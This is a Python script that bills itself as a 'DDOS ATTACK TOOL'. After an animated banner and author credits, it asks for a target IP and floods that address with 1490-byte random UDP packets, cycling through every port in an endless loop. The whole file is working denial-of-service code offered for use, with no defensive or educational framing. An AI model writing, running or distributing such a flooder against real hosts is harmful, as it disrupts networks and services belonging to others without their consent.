import socket
import random
import sys
import time
import os

# Animated text function
def animated(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Clear screen
os.system("clear")

# Animated logo
logo = """
\033[1;31m
             ▗▄▄▄  ▗▄▄▄   ▗▄▖  ▗▄▄▖
             ▐▌  █ ▐▌  █ ▐▌ ▐▌▐▌   
             ▐▌  █ ▐▌  █ ▐▌ ▐▌ ▝▀▚▖
             ▐▙▄▄▀ ▐▙▄▄▀ ▝▚▄▞▘▗▄▄▞▘
\033[1;32m                DDOS ATTACK TOOL
"""
info = '''
\033[1;32m ===============================================\033[1;36m
    AUTHOR   : Abdul Jabbar 
    Git Hub  : https://github.com/jsjabbar0
    Facebook : https://www.facebook.com/abdul.jabbar.267611
    Coder    : Jabbar 
\033[1;32m ===============================================           
'''
animated(logo, 0.01)
animated (info,0.02)
# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte_data = random._urandom(1490)

# Target info
ip = input("\033[1;36m[?] Enter your target IP: \033[0m")
count = 0
port = 1

# Attack loop
while True:
    try:
        sock.sendto(byte_data, (ip, port))
        count += 1
        print(f"\033[1;32m[√] Packet {count} sent to {ip}:{port}\033[0m")
        port += 1
        if port > 65535:
            port = 1
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Attack stopped by user.\033[0m")
        break